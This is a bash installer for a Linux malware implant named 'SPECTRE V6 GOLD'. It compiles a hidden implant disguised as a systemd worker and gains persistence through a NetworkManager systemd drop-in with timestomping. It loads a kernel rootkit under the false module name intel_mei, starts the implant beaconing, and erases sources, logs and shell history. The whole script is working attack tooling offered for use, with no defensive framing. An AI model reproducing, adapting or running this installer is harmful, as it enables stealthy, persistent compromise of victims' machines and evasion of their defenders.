#!/bin/bash
set -e

if [ "$EUID" -ne 0 ]; then
    echo "[-] Error: Run as root"
    exit 1
fi

echo "[*] SPECTRE V6 GOLD - Starting Infection..."

# 1. Détection OS & Dépendances
OS_TYPE="unknown"
if [ -f /etc/os-release ]; then
    ID=$(grep -E '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' | tr '[:upper:]' '[:lower:]')
    case $ID in
        debian|ubuntu|kali) OS_TYPE="debian" ;;
        fedora|centos|rhel) OS_TYPE="redhat" ;;
    esac
fi

echo "[*] Installing build dependencies..."
if [ "$OS_TYPE" = "debian" ]; then
    apt-get update >/dev/null 2>&1
    if apt-get install -y gcc make linux-headers-$(uname -r) >/tmp/spectre_deps.log 2>&1; then
        echo "[+] Dependencies installed."
    else
        echo "[!] Dependency warning. Check /tmp/spectre_deps.log"
    fi
elif [ "$OS_TYPE" = "redhat" ]; then
    dnf install -y -q gcc make kernel-devel-$(uname -r) >/dev/null 2>&1 || true
fi

# 2. Compilation
echo "[*] Compiling implant..."
if gcc implant.c -o /usr/libexec/.libsystemd-worker -lresolv -Os -s 2>/tmp/spectre_compile.log; then
    echo "[+] Compilation successful."
else
    echo "[-] Compilation failed. See /tmp/spectre_compile.log"
    exit 1
fi

# 3. Validation Crypto
if /usr/libexec/.libsystemd-worker --test-crypto 2>/dev/null; then
    echo "[+] Crypto self-test passed."
else
    echo "[-] Crypto self-test failed."
    exit 1
fi

# 4. Persistance
echo "[*] Establishing persistence..."
mkdir -p /etc/systemd/system/NetworkManager.service.d
cat > /etc/systemd/system/NetworkManager.service.d/99-security.conf << 'EOF'
[Service]
ExecStartPre=-/usr/libexec/.libsystemd-worker
EOF

# Timestomping
REF="/etc/machine-id"
[ ! -f "$REF" ] && REF="/etc/passwd"
touch -r "$REF" /etc/systemd/system/NetworkManager.service.d/99-security.conf 2>/dev/null
systemctl daemon-reload >/dev/null 2>&1

# 5. Rootkit
echo "[*] Loading Rootkit..."
if [ -d "/lib/modules/$(uname -r)/build" ] && [ -f Makefile ]; then
    if make >/dev/null 2>&1; then
        cp spectre_rk.ko /lib/modules/$(uname -r)/kernel/drivers/char/intel_mei.ko
        if ! lsmod | grep -q "intel_mei"; then
            if insmod /lib/modules/$(uname -r)/kernel/drivers/char/intel_mei.ko 2>/dev/null; then
                echo "intel_mei" >> /etc/modules 2>/dev/null
                [ -d "/etc/modules-load.d" ] && echo "intel_mei" > /etc/modules-load.d/intel.conf 2>/dev/null
                depmod -a 2>/dev/null
                echo "[+] Rootkit active (hidden)."
            else
                echo "[!] Rootkit load failed (Secure Boot?)."
            fi
        fi
    fi
else
    echo "[!] Skipping rootkit (headers missing)."
fi

# 6. Démarrage
pkill -f "libsystemd-worker" 2>/dev/null || true
nohup /usr/libexec/.libsystemd-worker --test >/dev/null 2>&1 &
sleep 2

if pgrep -f "libsystemd-worker" >/dev/null; then
    echo "[+] Implant running (TEST MODE: 60s beacon)."
else
    echo "[-] Failed to start process."
fi

# 7. Nettoyage
rm -f implant.c spectre_rk.c spectre_rk.ko *.mod.* modules.order Module.symvers Makefile 2>/dev/null
rm -f /tmp/spectre_*.log 2>/dev/null
history -c
echo "[+] DONE."
